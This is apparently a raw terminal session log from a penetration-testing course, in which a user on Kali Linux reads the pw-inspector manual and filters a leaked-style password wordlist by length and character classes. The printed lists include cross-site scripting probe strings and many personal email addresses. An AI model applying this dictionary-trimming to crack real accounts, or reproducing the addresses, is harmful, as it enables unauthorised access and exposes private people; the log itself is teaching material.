@@ -1,0 +1,1603 @@
+Script started on 2019-11-29 14:13:53+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="211" LINES="46"]
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# exitssh -hnmap -sV -p 1-65535 --traceroute 127.0.0.1[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cssh -h[K[2Pexit[Kwc -l pwd_alice.txt
+190 pwd_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# man pwd
+pwd   pwdx  
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# man pwd
+pwd   pwdx  
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# man pwd_[K[K-inspector 
+[?1049h[22;0;0t[?1h=PW-INSPECTOR(1)                                                                            General Commands Manual                                                                            PW-INSPECTOR(1)[m
+[m
+[1mNAME[0m[m
+       pw-inspector - A tool to reduce the password list[m
+[m
+[1mSYNOPSIS[0m[m
+       [1mpw-inspector[0m [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p -s[m
+[m
+[1mDESCRIPTION[0m[m
+       PW-Inspector  reads  passwords in and prints those which meet the requirements.  The return code is the number of valid passwords found, 0 if none was found.  Use for security: check passwords, if 0[m
+       is returned, reject password choice.  Use for hacking: trim your dictionary file to the pw requirements of the target.  Usage only allowed for legal purposes.[m
+[m
+[1mOPTIONS[0m[m
+       [1m-i[0m [1mFILE[0m[m
+              file to read passwords from (default: stdin)[m
+[m
+       [1m-o[0m [1mFILE[0m[m
+              file to write valid passwords to (default: stdout)[m
+[m
+       [1m-m[0m [1mMINLEN[0m[m
+              minimum length of a valid password[m
+[m
+       [1m-M[0m [1mMAXLEN[0m[m
+              maximum length of a valid password[m
+[m
+       [1m-c[0m [1mMINSETS[0m[m
+              the minimum number of sets required (default: all given)[m
+[m
+       [1m-h,[0m [1m--help[0m[m
+              Show summary of options.[m
+[m
+[1mSETS[0m[m
+       [1m-l[0m     lowcase characters (a,b,c,d, etc.)[m
+[m
+       [1m-u[0m     upcase characters (A,B,C,D, etc.)[m
+[m
+       [1m-n[0m     numbers (1,2,3,4, etc.)[m
+[m
+       [1m-p[0m     printable characters (which are not -l/-n/-p, e.g. $,!,/,(,*, etc.)[m
+[m
+        [1m-s[0m    special characters - all others not withint the sets above[m
+[m
+[1mSEE[0m [1mALSO[0m[m
+       [1mhydra[0m(1), [1mxhydra[0m(1).[m
+[m
+[7m Manual page pw-inspector(1) line 1 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mAUTHOR[0m[m
+[7m Manual page pw-inspector(1) line 2 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       hydra was written by van Hauser / THC <vh@thc.org> and co-maintained by David Maciejak <david.maciejak@gmail.com>.[m
+[7m Manual page pw-inspector(1) line 3 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page pw-inspector(1) line 4 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       This manual page was written by Daniel Echeverry <epsilon77@gmail.com>, for the Debian project (and may be used by others).[m
+[7m Manual page pw-inspector(1) line 5 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page pw-inspector(1) line 6 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K                                                                                                  24/05/2012                                                                                  PW-INSPECTOR(1)[m
+[7m Manual page pw-inspector(1) line 7 (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[1mSYNOPSIS[0m[m
+[46;1H[K[7m Manual page pw-inspector(1) line 6/51 91% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page pw-inspector(1) line 5/51 91% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM       pw-inspector - A tool to reduce the password list[m
+[46;1H[K[7m Manual page pw-inspector(1) line 4/51 85% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[1mNAME[0m[m
+[46;1H[K[7m Manual page pw-inspector(1) line 3/51 85% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HM[m
+[46;1H[K[7m Manual page pw-inspector(1) line 2/51 80% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[HMPW-INSPECTOR(1)                                                                            General Commands Manual                                                                            PW-INSPECTOR(1)[m
+[46;1H[K[7m Manual page pw-inspector(1) line 1/51 79% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KAA[K[K[7m Manual page pw-inspector(1) line 1/51 79% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[1mAUTHOR[0m[m
+[7m Manual page pw-inspector(1) line 2/51 80% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       hydra was written by van Hauser / THC <vh@thc.org> and co-maintained by David Maciejak <david.maciejak@gmail.com>.[m
+[7m Manual page pw-inspector(1) line 3/51 85% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page pw-inspector(1) line 4/51 85% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K       This manual page was written by Daniel Echeverry <epsilon77@gmail.com>, for the Debian project (and may be used by others).[m
+[7m Manual page pw-inspector(1) line 5/51 91% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[m
+[7m Manual page pw-inspector(1) line 6/51 91% (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K                                                                                                  24/05/2012                                                                                  PW-INSPECTOR(1)[m
+[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K [KESCESC[KOO[KBB[K[K[7m Manual page pw-inspector(1) line 7/51 (END) (press h for help or q to quit)[27m[K[K[?1l>[?1049l[23;0;0t]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# ll
+totale 28
+-rw-r--r-- 1 root root 4281 nov 29 14:17 out_alice.txt
+-rw-r--r-- 1 root root   74 nov 29 14:11 password.txt
+-rw-r--r-- 1 root root 4897 nov 29 14:12 pwd_alice.txt
+-rw-r--r-- 1 root root 8192 nov 29 14:15 script.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt 
+# This is a list of 2,151,220 unique ASCII passwords in sorted order according
+# $DateTime: 2016/03/27 16:04:06 $
+"><script>alert(1)</script>
+$1$$EceVAwadNboWKXCg2DfVp1
+$1$$i63gBKzKSznjzUiEWRZh0.
+$1$A$OsW5TjmIcgkbKylJ6NkWP
+$1$xxJB$bV79PPPRMT1dNXglbKfhs
+.Cesar.2009.Alejandro.
+0000003yLcfGKtH7M6p4z1
+0042cb440532bc9c593c1380d
+0987654321abcdef1234567890
+0Ou8VvrxN7KO1IhMbLY/JA==
+0bTW3MNmJ0AWCOkaYmiA7DIVGt8DX
+111-222-1933email@address.com
+111-222-1933email@address.tst
+12345678900987654321ABABAB
+1234567890abcdefghijklmn
+1234567890donannaphone
+123456789101112131415q
+12345678912Gg4A1hpReg019t
+123456789kaka123456789
+1326313258CRAZY85040COMBI
+152d55acf81b8da1d3934072
+172300465749d8720d2b95e3
+18/5/6/45/11/1/qwerty98765
+188408c93a0f7d4d67ae2f8e
+1983password1983password
+1a5s6d456zxc456xz4c56xz4c46c
+1ca90d6867bd2c61614247e8
+1f1q2w3e4r5t6y7u8i9o0p
+1lpha2ravo3harlie4elta**###
+1q2w3e4r5t6y7u8i9o0p-[=]
+1w6z4s2nfg22285025ertz
+2/wTFCw1KTyb5Sxi/bcbIw==
+21232f297a57a5a743894a0e
+21232f297a57a5a743894a0e4
+21312dsd32ewqdfr23esddddsad
+21st century schizoid man
+26475renato26475renato
+328r5yhoshdfo324t5908u
+35157b42117bb284c0dd82f306c0
+3wirtschaftskommission
+45fg5d465f546f54d61g6f
+4QrcOUm6Wau+VuBX8g+IPg
+4UJ2-5NLF-HFFA-9JW3-X2KV
+4a15f086f64ebc807562069fc62e
+51573m45zsFp5blYC6AIppsl
+5755B52ACF5AED5BED5B12
+5a4f5b0e8d9bb965244aec511ea2
+5js07dfgwccf575sgh42dfs
+6ZoYxCjLONXyYIU2eJIuAw==
+7292sdksj21892ksdkd829ksks
+7a57a5a743894a0e4a801fc3
+8287458823facb8ff918dbfab
+835B2D5E447C64B9A5782DD76353A
+88RVD-ACD27-ACAXT-7RXDN
+89f3ca5f6b8050238f4f48
+8a672ea3fa2348ba8622d144660
+9427438394507849toledo
+<h1>You are PWNED</h1>
+<script>alert(1)</script>
+@fytEm10 *Vb^mZ3%100iRt3h1337
+ABCDEFGHIJKLMNOPQRSTUV1
+Abbasraoufmahio20082010
+BM8t9xgtFQVRJKnrjmVG8g==
+BpFdMuHWpZE7d1JApE/xpHzHqWA=
+BulletForMyValentine<3
+Dnj4IQzrMSn8oup753tAPw==
+EAANt8NPs4oz7rDY_bz3pQHLg--~A
+ERWINRYAN_14@YAHOO.COM
+Elito e prekrasno momi4e ;)
+Esto no es una prueba de MD5
+Esto si es una prueba de MD5
+FJWr3X35w7nyqgZeHr8wo1
+Freestyler970Freestyler970
+I Love Indetectables.N3T
+JestemBeCometAiJestempr0:eye:
+JfnnlDI7RTiF9RgfG2JNCw==
+LP+vi8jtiQZBFVJCXkyLRA==
+OGy3DkWZPxgqjfWKmXrJEA==
+PaMarRuu6VxDqasesVfJgvD2fhk=
+QN9wb1WzCy0U3RZe/HELqA==
+QYYoUiD1cbIlTi2jPbgoQ0
+SXFS5DCFY6UD342JVBW6RD5CMY
+UPNE05tkNK2BT5ZFHnwDODhmjD1v
+Vincent1533&Vincent1533
+YvmDbXxRaVlTbysV3V0kmFtvL0TB
+YvmDbXxRaVlTbysV3V0kmFtvL0TBH
+ZXJpcjRxbnJ1YnZxbmU%3D
+a%3A2%3A%7Bs%3A5%3A%22
+a42bdef285d431054f2848d30af
+a42bdef285d431054f2848d30afa
+a42bdef285d431054f2848d30afac
+aD0enmhTH4T+JJJZtoqWUv8XDx4=
+aXRhbGlhbiBoYWNrZXIgY3Jldwo=
+adriano___10@hotmail.com
+angelz_gon_28@yahoo.com
+ballbanger_87@hotmail.com
+barca3.2009@hotmail.fr
+bd36e074b9ab08d51b53840fec23
+bhutoijo2004@yahoo.co.uk
+billsfanpt239@yahoo.com
+changzhou888changzhou888
+cutecapricorn85@hotmail.com
+emmalou965@hotmail.com
+f48a4948c8ea5a546f48...912c34
+faysal123456789123456789
+gerardomiguel08@yahoo.com
+globalisfelmelegedes2008
+h3artbroken@hotmail.co.uk
+h4ck3rs311t3confirming
+hM7O2NKhyOjKzJAMAjb2OahjpIEQ
+http://www.md5encrypter.com/
+hunter554856321789hunter
+kikugalanet142857142857
+kikugalanetSebastian15
+kikugalanetalisami1995
+kikugalanetmicrowelle007
+kikugalanetoliver07755
+kikugalanetterminator2
+kingriadtoufik23..........23
+knightdevil7gun@hotmail.com
+kyokushin1991@yahoo.com
+loe_she21st#yahoo.co.id
+loe_she21st@yahoo.co.id
+loeschen1@googlemail.com
+lu2tzfqmpztulx6a5yy78ntl
+mamasita123123123123123
+marcusandres89@live.com
+mariuszkrakowiak197619761976
+mbnCNs7PhE1eO96SdS1x7w
+melissamaya69@yahoo.com
+mfdn04fyinihamptccgp7g==
+mimoza-185@hotmail.com
+mongoscheissemal2hoch3
+motherfucker12345678910
+n369985g57w5h1v222df5g
+oJONJcKYstX.nPTm8D7W81
+predrag_93@hotmail.com
+qwXdI7tLsxxIqJ2bJ1WkBerBUK8=
+restyngkorea1234567890
+reva_4lien@yahoo.co.id
+sandra_oliva22@hotmail.com
+senha00EgwuN1XhLSsyG62Q
+sinterklaaskapoentje333
+sirmicandrijana96@hotmail.com
+sry musst bis zum 21 warten
+striped_girl_11@mail.ru
+t0-hasl0-j3st-bardz0-dlugi3
+tanzeelch17@hotmail.com
+terrysoh357#hotmail.com
+terrysoh357~hotmail.com
+treadstone87treadstone87
+tuttifrutti0tuttifrutti
+viktorija112@yahoo.com
+waterwolf96@hotmail.com
+whitementor68#yahoo.com
+whitementor68@yahoo.com
+windowsvistahomepremium1
+www.md5decrypter.co.uk
+www.myspace.com/drumgod911
+wxcvbnqsdfghjklm123456
+xa%3A2%3A%7Bs%3A5%3A%22
+yohohoandabottleofrum123
+zHvBpAVJQoTlT72OhRUCJw==
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt ll[Kpw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n[1@1[1P[C[C[C[C[C[C[C[C[C -M 21
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -M 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -M 21[C[1P 21m 21
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K
+# This is a list of 2,151,220 unique ASCII passwords in sorted order according
+# $DateTime: 2016/03/27 16:04:06 $
+"><script>alert(1)</script>
+$1$$EceVAwadNboWKXCg2DfVp1
+$1$$i63gBKzKSznjzUiEWRZh0.
+$1$A$OsW5TjmIcgkbKylJ6NkWP
+$1$xxJB$bV79PPPRMT1dNXglbKfhs
+.Cesar.2009.Alejandro.
+0000003yLcfGKtH7M6p4z1
+0042cb440532bc9c593c1380d
+0987654321abcdef1234567890
+0Ou8VvrxN7KO1IhMbLY/JA==
+0bTW3MNmJ0AWCOkaYmiA7DIVGt8DX
+111-222-1933email@address.com
+111-222-1933email@address.tst
+12345678900987654321ABABAB
+1234567890abcdefghijklmn
+1234567890donannaphone
+123456789101112131415q
+12345678912Gg4A1hpReg019t
+123456789kaka123456789
+1326313258CRAZY85040COMBI
+152d55acf81b8da1d3934072
+172300465749d8720d2b95e3
+18/5/6/45/11/1/qwerty98765
+188408c93a0f7d4d67ae2f8e
+1983password1983password
+1a5s6d456zxc456xz4c56xz4c46c
+1ca90d6867bd2c61614247e8
+1f1q2w3e4r5t6y7u8i9o0p
+1lpha2ravo3harlie4elta**###
+1q2w3e4r5t6y7u8i9o0p-[=]
+1w6z4s2nfg22285025ertz
+2/wTFCw1KTyb5Sxi/bcbIw==
+21232f297a57a5a743894a0e
+21232f297a57a5a743894a0e4
+21312dsd32ewqdfr23esddddsad
+21st century schizoid man
+26475renato26475renato
+328r5yhoshdfo324t5908u
+35157b42117bb284c0dd82f306c0
+3wirtschaftskommission
+45fg5d465f546f54d61g6f
+4QrcOUm6Wau+VuBX8g+IPg
+4UJ2-5NLF-HFFA-9JW3-X2KV
+4a15f086f64ebc807562069fc62e
+51573m45zsFp5blYC6AIppsl
+5755B52ACF5AED5BED5B12
+5a4f5b0e8d9bb965244aec511ea2
+5js07dfgwccf575sgh42dfs
+6ZoYxCjLONXyYIU2eJIuAw==
+7292sdksj21892ksdkd829ksks
+7a57a5a743894a0e4a801fc3
+8287458823facb8ff918dbfab
+835B2D5E447C64B9A5782DD76353A
+88RVD-ACD27-ACAXT-7RXDN
+89f3ca5f6b8050238f4f48
+8a672ea3fa2348ba8622d144660
+9427438394507849toledo
+<h1>You are PWNED</h1>
+<script>alert(1)</script>
+@fytEm10 *Vb^mZ3%100iRt3h1337
+ABCDEFGHIJKLMNOPQRSTUV1
+Abbasraoufmahio20082010
+BM8t9xgtFQVRJKnrjmVG8g==
+BpFdMuHWpZE7d1JApE/xpHzHqWA=
+BulletForMyValentine<3
+Dnj4IQzrMSn8oup753tAPw==
+EAANt8NPs4oz7rDY_bz3pQHLg--~A
+ERWINRYAN_14@YAHOO.COM
+Elito e prekrasno momi4e ;)
+Esto no es una prueba de MD5
+Esto si es una prueba de MD5
+FJWr3X35w7nyqgZeHr8wo1
+Freestyler970Freestyler970
+I Love Indetectables.N3T
+JestemBeCometAiJestempr0:eye:
+JfnnlDI7RTiF9RgfG2JNCw==
+LP+vi8jtiQZBFVJCXkyLRA==
+OGy3DkWZPxgqjfWKmXrJEA==
+PaMarRuu6VxDqasesVfJgvD2fhk=
+QN9wb1WzCy0U3RZe/HELqA==
+QYYoUiD1cbIlTi2jPbgoQ0
+SXFS5DCFY6UD342JVBW6RD5CMY
+UPNE05tkNK2BT5ZFHnwDODhmjD1v
+Vincent1533&Vincent1533
+YvmDbXxRaVlTbysV3V0kmFtvL0TB
+YvmDbXxRaVlTbysV3V0kmFtvL0TBH
+ZXJpcjRxbnJ1YnZxbmU%3D
+a%3A2%3A%7Bs%3A5%3A%22
+a42bdef285d431054f2848d30af
+a42bdef285d431054f2848d30afa
+a42bdef285d431054f2848d30afac
+aD0enmhTH4T+JJJZtoqWUv8XDx4=
+aXRhbGlhbiBoYWNrZXIgY3Jldwo=
+adriano___10@hotmail.com
+angelz_gon_28@yahoo.com
+ballbanger_87@hotmail.com
+barca3.2009@hotmail.fr
+bd36e074b9ab08d51b53840fec23
+bhutoijo2004@yahoo.co.uk
+billsfanpt239@yahoo.com
+changzhou888changzhou888
+cutecapricorn85@hotmail.com
+emmalou965@hotmail.com
+f48a4948c8ea5a546f48...912c34
+faysal123456789123456789
+gerardomiguel08@yahoo.com
+globalisfelmelegedes2008
+h3artbroken@hotmail.co.uk
+h4ck3rs311t3confirming
+hM7O2NKhyOjKzJAMAjb2OahjpIEQ
+http://www.md5encrypter.com/
+hunter554856321789hunter
+kikugalanet142857142857
+kikugalanetSebastian15
+kikugalanetalisami1995
+kikugalanetmicrowelle007
+kikugalanetoliver07755
+kikugalanetterminator2
+kingriadtoufik23..........23
+knightdevil7gun@hotmail.com
+kyokushin1991@yahoo.com
+loe_she21st#yahoo.co.id
+loe_she21st@yahoo.co.id
+loeschen1@googlemail.com
+lu2tzfqmpztulx6a5yy78ntl
+mamasita123123123123123
+marcusandres89@live.com
+mariuszkrakowiak197619761976
+mbnCNs7PhE1eO96SdS1x7w
+melissamaya69@yahoo.com
+mfdn04fyinihamptccgp7g==
+mimoza-185@hotmail.com
+mongoscheissemal2hoch3
+motherfucker12345678910
+n369985g57w5h1v222df5g
+oJONJcKYstX.nPTm8D7W81
+predrag_93@hotmail.com
+qwXdI7tLsxxIqJ2bJ1WkBerBUK8=
+restyngkorea1234567890
+reva_4lien@yahoo.co.id
+sandra_oliva22@hotmail.com
+senha00EgwuN1XhLSsyG62Q
+sinterklaaskapoentje333
+sirmicandrijana96@hotmail.com
+sry musst bis zum 21 warten
+striped_girl_11@mail.ru
+t0-hasl0-j3st-bardz0-dlugi3
+tanzeelch17@hotmail.com
+terrysoh357#hotmail.com
+terrysoh357~hotmail.com
+treadstone87treadstone87
+tuttifrutti0tuttifrutti
+viktorija112@yahoo.com
+waterwolf96@hotmail.com
+whitementor68#yahoo.com
+whitementor68@yahoo.com
+windowsvistahomepremium1
+www.md5decrypter.co.uk
+www.myspace.com/drumgod911
+wxcvbnqsdfghjklm123456
+xa%3A2%3A%7Bs%3A5%3A%22
+yohohoandabottleofrum123
+zHvBpAVJQoTlT72OhRUCJw==
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [Kpw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -M 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [Kll[Kcat out_alice.txt [1P[1P[1P[1@w[1@c[C[1@ [1@-[1@l
+165 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# wc -l out_alice.txt [2Pcat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [Kpw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [Kpw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -M 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [Kll[Kpw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cll[Kcat out_alice.txt pw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -M 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [Kpw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K[2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Kwc -l out_alice.txt [2Pcat[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -c 2 -l -u -n -m 21[1P[1P[1P[1P[1P
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cwc -l out_alice.txt [K
+52 out_alice.txt
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt 
+# This is a list of 2,151,220 unique ASCII passwords in sorted order according
+# $DateTime: 2016/03/27 16:04:06 $
+$1$$EceVAwadNboWKXCg2DfVp1
+$1$$i63gBKzKSznjzUiEWRZh0.
+$1$A$OsW5TjmIcgkbKylJ6NkWP
+$1$xxJB$bV79PPPRMT1dNXglbKfhs
+.Cesar.2009.Alejandro.
+0000003yLcfGKtH7M6p4z1
+0Ou8VvrxN7KO1IhMbLY/JA==
+0bTW3MNmJ0AWCOkaYmiA7DIVGt8DX
+12345678912Gg4A1hpReg019t
+2/wTFCw1KTyb5Sxi/bcbIw==
+4QrcOUm6Wau+VuBX8g+IPg
+51573m45zsFp5blYC6AIppsl
+6ZoYxCjLONXyYIU2eJIuAw==
+<h1>You are PWNED</h1>
+@fytEm10 *Vb^mZ3%100iRt3h1337
+Abbasraoufmahio20082010
+BM8t9xgtFQVRJKnrjmVG8g==
+BpFdMuHWpZE7d1JApE/xpHzHqWA=
+BulletForMyValentine<3
+Dnj4IQzrMSn8oup753tAPw==
+EAANt8NPs4oz7rDY_bz3pQHLg--~A
+Elito e prekrasno momi4e ;)
+Esto no es una prueba de MD5
+Esto si es una prueba de MD5
+FJWr3X35w7nyqgZeHr8wo1
+Freestyler970Freestyler970
+I Love Indetectables.N3T
+JestemBeCometAiJestempr0:eye:
+JfnnlDI7RTiF9RgfG2JNCw==
+LP+vi8jtiQZBFVJCXkyLRA==
+OGy3DkWZPxgqjfWKmXrJEA==
+PaMarRuu6VxDqasesVfJgvD2fhk=
+QN9wb1WzCy0U3RZe/HELqA==
+QYYoUiD1cbIlTi2jPbgoQ0
+UPNE05tkNK2BT5ZFHnwDODhmjD1v
+Vincent1533&Vincent1533
+YvmDbXxRaVlTbysV3V0kmFtvL0TB
+YvmDbXxRaVlTbysV3V0kmFtvL0TBH
+ZXJpcjRxbnJ1YnZxbmU%3D
+a%3A2%3A%7Bs%3A5%3A%22
+aD0enmhTH4T+JJJZtoqWUv8XDx4=
+aXRhbGlhbiBoYWNrZXIgY3Jldwo=
+hM7O2NKhyOjKzJAMAjb2OahjpIEQ
+kikugalanetSebastian15
+mbnCNs7PhE1eO96SdS1x7w
+oJONJcKYstX.nPTm8D7W81
+qwXdI7tLsxxIqJ2bJ1WkBerBUK8=
+senha00EgwuN1XhLSsyG62Q
+xa%3A2%3A%7Bs%3A5%3A%22
+zHvBpAVJQoTlT72OhRUCJw==
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# cat out_alice.txt [2@wc -l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpw-inspector -i pwd_alice.txt -o out_alice.txt -l -u -n -m 21[C[C[1@1[1@ [1@1[1@ [1@1[C[C[1@ 
+]0;root@kali: ~/Corso_PT/Day_5[01;31mroot@kali[00m:[01;34m~/Corso_PT/Day_5[00m# pw-inspector -i pwd_alice.txt -o out_alice.txt -l 1 -u 1 -n 1 -m 21[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ccat out_alice.txt [K
+# This is a list of 2,151,220 unique ASCII passwords in sorted order according
+# $DateTime: 2016/03/27 16:04:06 $
+$1$$EceVAwadNboWKXCg2DfVp1
+$1$$i63gBKzKSznjzUiEWRZh0.
+$1$A$OsW5TjmIcgkbKylJ6NkWP
+$1$xxJB$bV79PPPRMT1dNXglbKfhs
+.Cesar.2009.Alejandro.
+0000003yLcfGKtH7M6p4z1
+0Ou8VvrxN7KO1IhMbLY/JA==
+0bTW3MNmJ0AWCOkaYmiA7DIVGt8DX
+12345678912Gg4A1hpReg019t
+2/wTFCw1KTyb5Sxi/bcbIw==
+4QrcOUm6Wau+VuBX8g+IPg
+51573m45zsFp5blYC6AIppsl
+6ZoYxCjLONXyYIU2eJIuAw==
+<h1>You are PWNED</h1>
+@fytEm10 *Vb^mZ3%100iRt3h1337
+Abbasraoufmahio20082010
+BM8t9xgtFQVRJKnrjmVG8g==
+BpFdMuHWpZE7d1JApE/xpHzHqWA=
+BulletForMyValentine<3
+Dnj4IQzrMSn8oup753tAPw==
+EAANt8NPs4oz7rDY_bz3pQHLg--~A
